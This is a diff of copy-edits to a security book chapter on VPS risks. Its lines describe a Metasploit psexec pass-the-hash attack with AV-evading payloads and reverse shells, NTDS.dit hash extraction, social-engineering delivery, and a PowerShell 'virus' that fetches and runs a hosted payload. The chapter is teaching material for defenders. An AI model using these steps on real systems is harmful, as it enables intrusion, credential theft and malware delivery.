@@ -2,12 +2,12 @@
 
 ![10,000' view of VPS Security](images/10000VPS.png)
 
-If it makes sense, I usually advocate bringing VPS(s) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have more control. Most of my work around VPS's are with GNU/Linux instances. Most of the testing in this chapter was performed on Debian instances, usually, but not allways, web servers. Unless stated otherwise, the following applies to these type of instances.
+When it makes sense, I usually advocate bringing virtual private server (VPS) [in-house](http://blog.binarymist.net/2014/11/29/journey-to-self-hosting/) where you have more control. Most of my work around VPSs are with GNU/Linux instances. Most of the testing in this chapter was performed on Debian instances, and usually, but not allways, web servers. Unless stated otherwise, the following applies to these type of instances.
 
 ## 1. SSM Asset Identification {#vps-asset-identification}
 Take results from higher level Asset Identification found in the 30,000' View chapter of [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:
 
-* Ownership. At first this may sound strange, but that is because of an assumption you may have that it is a given that you will always own, or at least have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. Possibly it is just for kicks, possibly it is for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your it as a liability. Both may be correct. In any case, you need to protect your server(s) and in many cases take it to school and teach it how to protect itself. This is covered under the [SSM Countermeasures](#vps-countermeasures) section with items such as HIDS and Logging and Alerting.
+* Ownership. At first this may sound strange, you likely assume that it is given that you will always own, or at have control of your server(s). I am going to dispel this myth. When an attacker wants to compromise your server(s), they want to do so for a reason. It may just be for kicks, or it may be for some more sinister reason. They want an asset that presumably belongs to you, your organisation, or your customers. If they can take control of your server(s) (own it, steal it, abuse it, etc.), then they have a foot hold to launch further attacks and gain control or other assets that do not belong to them. With this in mind, you could think of your server(s) as an asset. On the other hand you could think of your server as a liability. Both may be correct. In any case, you need to protect your server(s) and ensure a hardened security posture. This is covered under the [SSM Countermeasures](#vp, s-countermeasures) section with items such as HIDS, Logging, and Alerting.
 * Visibility into and of many things, such as:
   * Disk space
   * Disk IO
@@ -20,11 +20,11 @@ Take results from higher level Asset Identification found in the 30,000' View ch
   * What any user is doing on the system currently
   * Network connections
   * Etc
-* Taking the confidential business and client information from the "Starting with the 30,000' view" chapter, here we can concretise these concepts into forms such as:
+* Take the confidential business and client information from the "Starting with the 30,000' view" chapter, here we can solidify these concepts into forms such as:
   * Email, Web, Data-store servers and of course the data on them.
-  * You could even stretch this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the Mobile chapter of [Fascicle 2](https://leanpub.com/holistic-infosec-for-web-developers-fascicle2-mobile-iot))
+  * You could even convey this to individuals PCs and other devices which may be carrying this sort of confidential information on them. Mobile devices are a huge risk for example (covered in the Mobile chapter of [Fascicle 2](https://leanpub.com/holistic-infosec-for-web-developers-fascicle2-mobile-iot))
 
-This is probably an incomplete list for your domain. I have given you a start. Put your thinking cap on and populate the rest, or come back to it as additional assets enter your mind.
+This is probably an incomplete list for your domain, I have merely given you a start. Put your critical thinking to use and populate the rest, or come back to the process as additional assets enter your mind.
 
 ## 2. SSM Identify Risks
 Go through same process as we did at the top level in [Fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers), but for your VPS(s).
@@ -36,30 +36,30 @@ Go through same process as we did at the top level in [Fascicle 0](https://leanp
 ### Forfeit Control thus Security {#vps-identify-risks-forfeit-control-thus-security}
 ![](images/ThreatTags/average-widespread-average-severe.png)
 
-In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).
+In terms of security, unless your provider is [Swiss](http://www.computerweekly.com/news/2240187513/Is-Switzerland-turning-into-a-cloud-haven-in-the-wake-of-Prism-scandal), you give up so much when you forfeit your system controls(s) to an external provider. I cover this in my talk ["Does Your Cloud Solution Look Like a Mushroom"](http://blog.binarymist.net/presentations-publications/#does-your-cloud-solution-look-like-a-mushroom).
 
 * If you do not own your VPS(s), you will have very limited security, visibility and control over the infrastructure.
-* Limited (at best) visibility into any hardening process your CSP takes. Essentially you "Get what you are given".
-* Cloud and hosting providers are in many cases forced by governments and other agencies to give up your secrets. It is very common place now and you may not even know that it has happened. Swiss providers may be the exception here.
-* What control do you have that if you are data in the cloud has been compromised you actually know about it and can invoke your incident response team(s) and procedures?
-* Cloud and hosting providers are readily giving up your secrets to government organisations and the highest bidders. In many cases you will not know about it.
-* Your provider may go out of business and you may get little notice of this.
-* Providers are outsourcing their outsourced services to several providers deep. They do not even have visibility themselves. Control is lost.
-* \> distribution = > attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
+* Limited (at best) visibility into any hardening process your CSP takes. Essentially, you "Get what you are given".
+* Cloud and hosting providers are, in many cases, forced by governments and other agencies to give up your secrets. It is very common place now, and you may not even know that it has happened. Swiss providers may be the exception here.
+* Do you have enough control, such that if your data is in the cloud and has been compromised, you actually know about it, and can invoke your incident response team(s) and procedures?
+* Cloud and hosting providers are readily giving up your secrets to government organisations, and the highest bidders. In many cases you will not know about it.
+* Your provider may go out of business, and you may get little notice of this.
+* Providers are often outsourcing their services to several additional providers. They do not even have visibility themselves, further control is lost.
+* Distribution = attack surface. Where is your data? Where are your VM images running from? Further distributed on iSCSI targets? Where are the targets?
 * Your provider knows little (at best) about your domain, how you operate, or what you have running on their system(s). How are they supposed to protect you if they have no knowledge of your domain?
 
 ### Windows {#vps-identify-risks-Windows}
 
-Windows exploitation is prevalent, easy and fun, because there is what seems to be a never ending source of security defects. I am not going to attempt to cover much, as I would be here for to long, and this book series is more focussed on giving you a broad understanding with examples as we go.
+Windows exploitation is prevalent, easy and fun, because there is what seems to be a never ending source of security defects. I am not going to attempt to cover much, as I would be here for too long, and this book series is more focused on giving you a broad understanding with examples as we go.
 
-The problem is not so much that there is a never ending source of defects in Windows, but rather, that the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and often comes down to applying band-aids over top of the defects rather than being able to remove them.
+The problem is less that there are defects in Windows, but rather, that the platform was not designed with openness as a core attribute. Because of its closed nature, hardening the platform in many cases is very difficult and often comes down to applying band-aids over top of the defects, rather than being able to remove them.
 
-If you want a platform that you can have a decent level of control over its security, do not buy into closed offerings.
+If you want a platform that you can have a decent level of control over its security, do not buy closed offerings.
 
 #### PsExec {#vps-identify-risks-psexec}
 ![](images/ThreatTags/average-common-difficult-severe.png)
 
-PsExec was written by Mark Russinovich as part of the Sysinternals tool suite. PsExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a [Telnet replacement](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx).  
+PsExec was written by Mark Russinovich as part of the Sysinternals tool suite. PsExec is tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage, or hack. It also serves as a [Telnet replacement](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx).  
 PsExec [requires](https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified) a few things on the target system:
 
 1. The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)
@@ -68,7 +68,7 @@ PsExec [requires](https://community.rapid7.com/community/metasploit/blog/2013/03
 4. The Admin$ share (which maps to the Windows directory) must be available and accessible, test it first
 5. The credentials supplied to the PsExec utility must have permissions to access the Admin$ share
 
-There are several [behavioural techniques](https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified), or [targets](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#scenarios) as Metasploit calls them for the `psexec` module. In this case we use the Native Upload Target, but using a custom compiled payload (`set exe::custom`), you can see this in The Play below. What happens here is that our payload is embedded into a Windows Service executable within the PsExec executable, which it then deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PsExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.
+There are several [behavioural techniques](https://community.rapid7.com/community/metasploit/blog/2013/03/09/psexec-demystified), or [targets](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#scenarios) as Metasploit calls them, for the `psexec` module. In this case we use the Native Upload Target, but use a custom compiled payload (`set exe::custom`); you can see this in The Play below. Our payload is embedded into a Windows Service executable within the PsExec executable, which it then deploys to the Admin$ share on the target machine. The DCE/RPC interface is then used over SMB to access the Windows Service Control Manager (SCM) API. PsExec then turns on its Windows Service on the target machine. This service then creates a named pipe which can be used to send commands to the system.
 
 The Metasploit [`psxec` module](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec) (`exploit/windows/smb/psexec`) uses basically the same principle. This was the first of the "Pass The Hash" suite of Metasploit modules, [first committed](https://github.com/rapid7/metasploit-framework/commits/master/modules/exploits/windows/smb/psexec.rb?after=Y3Vyc29yOk6%2FV6xQayGnXiF%2FSfDmc6XJLm5lKzEwNA%3D%3D) on 2007-07-03
 
@@ -77,15 +77,15 @@ The Metasploit [`psxec` module](https://www.rapid7.com/db/modules/exploit/window
 
 The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) of that series will provide some additional context and it is probably best to look at it first if you have not already.
 
-You can find the video of how it is played out at [http://youtu.be/1EvwwYiMrV4](http://youtu.be/1EvwwYiMrV4).
+You can find the video of this scenario at [http://youtu.be/1EvwwYiMrV4](http://youtu.be/1EvwwYiMrV4).
 
 I> ## Synopsis
 I>
 I> This demo differs from the previous in that we do not rely on any of the targets direct interaction. There is no longer a need for the browser.  
 I> We open a reverse shell from the victim to us using Metasploit.  
-I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
-I> With this attack you will have had to have obtained the targets username and password or [password hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).  
-I> We leverage PsExec which expects your binary to be a windows service.
+I> We use Veil-Evasion, with the help of hyperion, to encrypt our payload to evade AV.  
+I> This attack requires that you obtain the target's username and password, or [password hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).  
+I> We leverage PsExec, which expects your binary to be a windows service.
 I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I have not included these steps in this play though, although the video assumes they have been included.
 
 {icon=bomb}
@@ -112,7 +112,7 @@ G> [Enter]
 G> Exit out of Veil-Evasion.
 G>
 G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
-G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:  
+G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself at the time of execution. The command to run is:  
 G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
 G> We then put the encrypted payload somewhere where Metasploit can access it:  
 G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
@@ -130,59 +130,58 @@ G> `set smbuser <target username>`
 G> `set` [`smbpass`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md#options) <target password or hash>  
 G> `run`
 G>
-G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.
+G> The IP addresses and ports need to be the same as you specified when creating the payload using Veil-Evasion.
 
 {icon=bomb}
-G> Now we have got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
+G> Now we have the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We need to acquire the username & password, or hash as they are transmitted across the network, or easily obtainable if you have physical access to the machine.
 G>
 G> We now run msfconsole with the resource file as parameter:  
 G> `msfconsole -r ~/demo.rc`  
-G> and that is enough to evade AV and get our reverse shell.
+G> This effort is enough to evade AV and obtain our reverse shell.
 G>
 G> `sessions` will show you the active sessions you have.  
 G> To interact with the first one:  
 G> `sessions -i 1`
 G>
-G> From here on in, the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) demonstrates creating a new file beside the targets hosts file, thus demonstrating full system privileges.
+G> The remainder of this play is seen in the [video](https://www.youtube.com/watch?v=1EvwwYiMrV4) that demonstrates creating a new file next to the target's hosts file, thus demonstrating full system privileges.
 
-Just before the Synopsis, I mentioned that there were several behavioural techniques for the `psexec` module. One of the other techniques, called "MOF Upload Target" is to use Managed Object Format (MOF) files which use the C++ syntax. These MOF files must be compiled and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, `psexec` does not execute anything, all it does is upload your executable to `SYSTEM32`, and a MOF file to `SYSTEM32\wbem\mof\`. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the paylod in `SYSTSEM32`. Metasploits MOF library only works with Windows XP and Server 2003. There is also the same high chance of getting sprung by AV, although you can carry out similar tricks as we did above to get around the AV signatures.
+Just before the Synopsis, I mentioned that there were several behavioural techniques for the `psexec` module. One of the other techniques, called "MOF Upload Target" is to use Managed Object Format (MOF) files, which use C++ syntax. These MOF files must be compiled, and are then consumed by Windows Management Instrumentation (WMI). This works quite differently, `psexec` does not execute anything, all it does is upload your executable to `SYSTEM32`, and a MOF file to `SYSTEM32\wbem\mof\`. When windows receives the event for the new MOF file, it compiles and executes it, which tells Windows to run the payload in `SYSTSEM32`. Metasploit's MOF library only works with Windows XP and Server 2003. There is also the high likelihood of being detected by AV, although you can carry out similar tricks as we did above to get around the AV signatures.
 
-If you are running a penetration test for a client and your targets AV fires, then it could be game over for you. There are better options that exist now that are less likely to ring alarm bells with your target.
+If you are running a penetration test for a client and your target's AV fires, then it could be game over for you. There are better options that exist now that are less likely to ring alarm bells with your target.
 
 #### Pass The Hash (PTH) suite of Metasploit Modules {#vps-identify-risks-windows-pth-suite-of-metasploit-modules}
 ![](images/ThreatTags/average-common-difficult-severe.png)
 
-We have just detailed and demonstrated the first of the Metasploit PTH suite above. Kali Linux also has the "[Pass the Hash toolkit](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)" (with all tools prefixed with "pth-"). The following are the rest of the Metasploit PTH modules in order of when they were introduced. All of the PTH suite except `psexec_ntdsgrab` depend on [CVE-1999-0504](https://www.cvedetails.com/cve/cve-1999-0504). They also all make use of the PsExec utility except the last one `wmi`. You will notice that some of these are exploits and some are technically auxiliary modules, as you read their descriptions, you will understand why.
+We have just detailed and demonstrated the first of the Metasploit PTH suite above. Kali Linux also has the "[Pass the Hash toolkit](https://www.kali.org/tutorials/pass-the-hash-toolkit-winexe-updates/)" (all tools are prefixed with "pth-"). The following are the rest of the Metasploit PTH modules in chronological order of their introduction. All of the PTH suite except `psexec_ntdsgrab` depends on [CVE-1999-0504](https://www.cvedetails.com/cve/cve-1999-0504). They also all make use of the PsExec utility, except the last one `wmi`. You will notice that some of these are exploits, and some are technically auxiliary modules. As you read their descriptions, you will understand why.
 
 1. [`current_user_psexec`](https://www.rapid7.com/db/modules/exploit/windows/local/current_user_psexec)  
 (2012-08-01) `exploit/windows/local/current_user_psexec`  
 "PsExec via Current User Token"  
    
    1. This module uploads an executable file to the victim system, then creates a share containing that executable
-   2. Then creates a remote service on each target system similar to the `psexec` module, using a UNC path to the file on the victim system, this is essentially a pivot, or lateral movement.
-   3. Then starts the service(s) on the target hosts which run the executable from step 1. The reason the service(s) on the target(s) can be placed and run, is because we are using the victims legitimate current session's authentication token to pivot to the target(s), we do not need to know the credentials for the target(s).  
+   2. It then creates a remote service on each target system similar to the `psexec` module, using a UNC path to the file on the victim system. This is essentially a pivot, or lateral movement.
+   3. It then starts the service(s) on the target hosts which run the executable from step 1. The service(s) can be placed and ru on the target(s) because we are using the victims legitimate current session's authentication token to pivot to the target(s), we do not need to know the credentials for the target(s).  
+      You are going to want to run ss to find out which system(s), if any, the administrator is connected to, ideally something important like a Domain Controller. From the victim, you can compromise many targets using the same administrators authentication token.  
    
-   You are going to want to run ss to find out which system(s) if any, the administrator is connected to, ideally something important like a Domain Controller. From the victim, you can compromise many targets using the same administrators authentication token.  
-   
-   This is a local exploit, it has to be run from an already compromised administrator that you have a Meterpreter session on, a reverse shell for example, against your target, this is where the pivot occurs.  
+   This is a local exploit, it has to be run via an already compromised administrator session that you have Meterpreter connectivity to, for example a reverse shell on your target, from which you will pivot.  
    
 2. [`psexec_command`](https://www.rapid7.com/db/modules/auxiliary/admin/smb/psexec_command)  
 (2012-11-23) `auxiliary/admin/smb/psexec_command`  
 "Microsoft Windows Authenticated Administration Utility"  
    
-   This module passes the valid administrator credentials, then executes a single arbitrary Windows command on one or more target systems, using a similar technique to the PsExec utility provided by SysInternals. This will not trigger AV as no binaries are uploaded, we are simply leveraging cmd.exe. but it also does not provide a meterpreter shell. Concatenating commands with '&' does not work.  
+   This module passes the valid administrator credentials, then executes a single arbitrary Windows command on one or more target systems, using a similar technique to the PsExec utility provided by SysInternals. This will not trigger AV as no binaries are uploaded, we are simply leveraging cmd.exe, but nor does it provide a Meterpreter shell. Concatenating commands with '&' does not work.  
    
 3. [`psexec_loggedin_users`](https://www.rapid7.com/db/modules/auxiliary/scanner/smb/psexec_loggedin_users)  
 (2012-12-05) `auxiliary/scanner/smb/psexec_loggedin_users`  
 "Microsoft Windows Authenticated Logged In Users Enumeration"  
    
-   This module passes the valid administrator credentials, then using a similar technique to that of the PsExec utility queries the HKU base registry key on the remote machine with reg.exe to get the list of currently logged in users. Notice this is a scanner module, so it can be run against many target machines concurrently.  
+   This module passes the valid administrator credentials, then using a similar technique to that of the PsExec utility, queries the HKU base registry key on the remote machine with reg.exe to get the list of currently logged in users. Notice this is a scanner module, so it can be run against many target machines concurrently.  
    
 4. [`psexec_psh`](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)  
 (2013-1-21) `exploit/windows/smb/psexec_psh`  
 "Microsoft Windows Authenticated Powershell Command Execution"  
    
-   This module passes the valid administrator credentials as usual, then attempts to execute a powershell payload using a similar technique to the PsExec utility. This method is far less likely to be detected by AV because: PowerShell is native to Windows, each payload is unique because it is your script and it is just base64 encoded, more likely to escape signature based detection, it also never gets written to disk. It is executed from the commandline using the `-encodedcommand ` flag and provides the familiar Meterpreter shell.  
+   This module passes the valid administrator credentials as usual, then attempts to execute a powershell payload using a similar technique to the PsExec utility. This method is far less likely to be detected by AV because PowerShell is native to Windows, each payload is unique because it is your script and it is  base64 encoded, more likely to escape signature based detection. It also never gets written to disk and is executed from the commandline using the `-encodedcommand ` flag. It also provides the familiar Meterpreter shell.  
    
    * "_A persist option is also provided to execute the payload in a while loop in order to maintain a form of persistence._"
    * "_In the event of a sandbox observing PowerShell execution, a delay and other obfuscation may be added to avoid detection._"
@@ -192,9 +191,9 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
 (2013-03-15) `auxiliary/admin/smb/psexec_ntdsgrab`  
 "PsExec `NTDS.dit` And SYSTEM Hive Download Utility"  
    
-   Similar to SmbExec that we setup in the Tooling Setup chapter of Fascicle 0, this Metasploit module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE% using a native Windows tool "vssadmin" (visible in the [source](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb#L55)). It then pulls down copies of the `NTDS.dit` file as well as the SYSTEM registry hive and stores them. The `NTDS.dit` and SYSTEM registry hive copy can be used in combination with other tools for offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host.  
+   Similar to SmbExec that we set up in the Tooling Setup chapter of Fascicle 0, this Metasploit module authenticates to an Active Directory Domain Controller and creates a volume shadow copy of the %SYSTEMDRIVE% using a native Windows tool "vssadmin" (visible in the [source](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/psexec_ntdsgrab.rb#L55)). It then pulls down copies of the `NTDS.dit` file, as well as the SYSTEM registry hive and stores them. The `NTDS.dit` and SYSTEM registry hive copy can be used in combination with other tools for offline extraction of AD password hashes. All of this is done without uploading a single binary to the target host.  
    
-   There are additional details around where `NTDS.dit` fits into the picture in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter.  
+   There are additional details around where `NTDS.dit` fits into the big picture in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter.  
    
    Unlike SmbExec, we have to parse the files that `psexec_ntdsgrab` downloads for us with a separate tool, also discussed briefly in the [Windows section](#web-applications-countermeasures-management-of-application-secrets-store-configuration-windows) of the Web Applications chapter.  
    
@@ -208,24 +207,24 @@ We have just detailed and demonstrated the first of the Metasploit PTH suite abo
    
    WMI core components are present by default in all Windows OS versions from Windows 2000 and after. Previous Windows releases can run WMI, but the components have to be installed.  
    
-   Windows Server 2008 included the minimalistic Server Core, smaller codebase, no GUI (less attack surface).  
+   Windows Server 2008 included the minimalistic Server Core, smaller codebase, and no GUI (less attack surface).  
    
    Windows Server 2012 added the ability to switch between GUI and Server Core.  
    
-   Windows Server 2016 added Nano Server to the mix of options. Nano Server has what they call a minimal footprint and is headless. It excludes the local GUI, and all management is carried out via WMI, PowerShell, and Remote Server Management Tools (a collection of web-based GUI and command line tools). In Technical Preview 5 (2016-04-17), the ability to manage locally using PowerShell was added. So we see the continued commitment to support these tools going forward, so they will continue to be excellent attack vectors and play an important part in the attackers toolbox and attack surface.  
+   Windows Server 2016 added Nano Server to the mix of options. Nano Server has what is referred to as a minimal footprint, and is headless. It excludes the local GUI, and all management is carried out via WMI, PowerShell, and Remote Server Management Tools (a collection of web-based GUI and command line tools). In Technical Preview 5 (2016-04-17), the ability to manage locally using PowerShell was added. As such, we see the continued commitment to support these tools going forward, they will continue to be excellent attack vectors and play an important part in the attackers toolbox and attack surface.  
    
    [WMI Providers](https://msdn.microsoft.com/en-us/library/aa394570(v=vs.85).aspx) provide interfaces for configuring and monitoring Windows services, along with programming interfaces for consumption via custom built tools.  
    
-   WMI needs to be accessible for remote access, of which there are step(s) to make sure this is the case. These step(s), vary depending according to the specific Windows release and other configurations.  
+   WMI needs to be accessible for remote access, of which there are step(s) to make sure this is the case. These step(s) vary according to the specific Windows release and other configurations.  
    
-   Rather than relying on SMB via the psexec technique, starting a service on the target, the `wmi` module executes PowerShell on the target using the current user credentials or those that you supply, so this is still a PTH technique. We use the WMI Command-line (WMIC) to [start a Remote Procedure Call](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/wmic.rb#L48) on TCP port 135 and an ephemeral port. Then create a [ReverseListenerComm](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/wmi.rb#L61) to tunnel traffic through that session.
+   Rather than relying on SMB via the psexec technique, starting a service on the target, the `wmi` module executes PowerShell on the target using the current user credentials, or those that you supply, therefore this is still a PTH technique. We use the WMI Command-line (WMIC) to [start a Remote Procedure Call](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/post/windows/wmic.rb#L48) on TCP port 135 and an ephemeral port, then create a [ReverseListenerComm](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/wmi.rb#L61) to tunnel traffic through that session.
 
 #### PowerShell {#vps-identify-risks-powershell}
 ![](images/ThreatTags/average-common-average-severe.png)
 
-[By default](https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/), PowerShell is installed on Windows Server 2008 R2 and Windows 7 onwards.
+[By default](https://blogs.msdn.microsoft.com/powershell/2008/10/28/powershell-will-be-installed-by-default-on-windows-server-08-r2-ws08r2-and-windows-7-w7/), PowerShell is installed on Windows Server 2008 R2 and Windows 7 onward.
 
-PowerShell "_is going to be on all boxes and it going provide access to everything on the box_" This is excellent news for penetration testers and other attackers!
+PowerShell "_is going to be on all boxes and it going provide access to everything on the box_". This is excellent news for penetration testers and other attackers!
 
 On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the default execution policy is RemoteSigned, but that is easily overridden in a script as you will see soon. We:
 
@@ -233,19 +232,19 @@ On Windows Server from PowerShell 4.0 onwards (Windows 8.1, Server 2012 R2), the
 * Have full access to the .Net framework
 * Can assemble malicious shell code in memory without AV detection
 
-Then you just need to get some code run on your targets machine. There are many ways to achieve this. Off the top of my head:
+You then just need to get some code to run on your target's machine. There are many ways to achieve this:
 
-* Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisations structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisations trust structure this way. Then you will have implicit trust. They will run your code or open your office document
-* Just befriend your target or someone close enough to your target inside the target organisation, have them run your code once they trust you. Then traverse once you have persistence on their machine
+* Find someone that your target trusts and become (pretext) them, services like LinkedIn are good for this, as that will generally allow you to piece the organisation's structure together with freely available OSINT that will not ring any alarm bells. It is pretty easy to build a decent replica of the organisation's trust structure this way. Then you will have implicit trust, they will run your code or open your Office document
+* Just befriend your target, or someone close enough to your target inside the target organisation, have them run your code once they trust you, then traverse once you have persistence on their machine
 * Find someone that usually sends files or links to files via email or similar and spoof the from address as discussed in the People chapter.
 * CD, DVD, USB stick drops, etc.
-* Using existing credentials you obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the targets network.
+* Using existing credentials you obtained by any of the means detailed in the People chapter and maybe logging into Outlook Web Access (OWA) or similar. Most people still use the same or similar passwords for multiple accounts. You only need one of them from someone on the target's network.
 
-Metasploit or setoolkit generating office files or pdfs usually trigger AV, but this is much easier to get around with PowerShell.
+Metasploit or the setoolkit generating Office files or PDFs usually trigger AV, but this is much easier to get around with PowerShell.
 
-Traditionally the payload would have to be saved to the targets file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with [HIDS/HIPS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids). AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts, as it is so easy to make changes to the script, but keep the script intent doing the same thing. To make matters worse, PowerShell is tightly integrated now with the Windows Operating Systems.
+Traditionally, the payload would have to be saved to the target's file system, but with PowerShell and other scripting languages, the payload can remain in memory, this defeats many AV products along with [HIDS/HIPS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids). AV vendors continue to get better at detecting malware that is compiled to native assembly, but they struggle to interpret the intent of scripts. It's easy to make changes to scripts, while maintaining the script's original intent. To make matters worse, PowerShell is tightly integrated with the Windows operating system.
 
-So what we are doing is making our viruses and payloads look like chameleons or business as usual (BAU), to detection mechanisms.
+What we are ultimately doing is building malware and payloads with chameleon-like charcteristics, or business as usual (BAU) software, to detection mechanisms.
 
 #### PowerShell Exploitation via Executable C/- [Psmsf](https://github.com/nixawk/psmsf) {#vps-identify-risks-powershell-exploitation-via-executable-psmsf}
 ![](images/ThreatTags/average-common-average-severe.png)
@@ -254,7 +253,7 @@ So what we are doing is making our viruses and payloads look like chameleons or 
 
 I> ## Synopsis
 I>
-I> In this play, we will use `psmsf` to create a Metasploit resource file to get `msfconsole` on our attacking machine listening for a reverse tcp shell from our target.  `psmsf` will also leverage  [`msfvenom`](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) to create native windows shellcode from c. `psmsf` inserts this shellcode into a PowerShell script then base64 encodes the script, and adds it to a text file prefixed with a PowerShell command to run the base64 encoded PowerShell script.
+I> In this play, we will use `psmsf` to create a Metasploit resource file to configure `msfconsole` on our attacker system to listen for a reverse tcp shell from our target.  `psmsf` will also leverage  [`msfvenom`](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) to create native Windows shellcode from c. `psmsf` inserts this shellcode into a PowerShell script, then base64 encodes the script. The base64 encoded script is added to a text file prefixed with a PowerShell command that then runs it.
 I>
 I> We then upload / host the payload generated by `psmsf`.
 I> 
@@ -262,9 +261,9 @@ I> We then create a small c file (that we call the virus) that downloads and exe
 I>
 I> Our target runs the virus.  
 I> The virus downloads and executes the payload.  
-I> The payload runs the base64 encoded script inside it, which spawns a thread and runs immediately from the calling instance of PowerShell which executes a section of memory that we over-write with the shellcode. This runs the reverse shell that the attacking machine is listening for.
+I> The payload runs the base64 encoded script inside it, which spawns a thread and runs immediately from the calling instance of PowerShell, which executes a section of memory that we over-write with the shellcode. This runs the reverse shell that the attacking machine is listening for.
 
-Meterpreter is an excellent platform for attacking with. It provides us with many useful tools which make tasks like privilege escalation, establishing persistence, lateral movement, pivoting, and others, much easier.
+Meterpreter is an excellent attacker platform. It provides us with many useful tools which make tasks like privilege escalation, establishing persistence, lateral movement, pivoting, and others, much easier.
 
 The shellcodes available in `psmsf` are the following `msfvenom` payloads, of which the second one we use in this play:
 
@@ -310,7 +309,7 @@ G> * Copy paste the contents of the file into a Windows terminal
 G> * Run the file directly: `cmd.exe /c powershell_hacking.bat`
 
 {icon=bomb}
-G> Either of these two options are fine if you have access to the targets machine. If not, you will really need to conceal your true intent from the target that we have built a trust relationship with. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).
+G> Either of these two options are fine if you have access to the target's machine. If not, you will really need to conceal your true intent from the target with whom you have built a trust relationship. We need to hide not only the payload (intent) contents, but also the code (virus) that fetches the payload and runs it (not yet discussed).
 G>
 G> Host your payload:
 G>
@@ -321,7 +320,7 @@ G> Start your web server:
 G> `Service apache2 start`  
 G> `curl <listener-attack-ip>/payload.txt` or just browse the payload to verify that it is hosted.
 G>
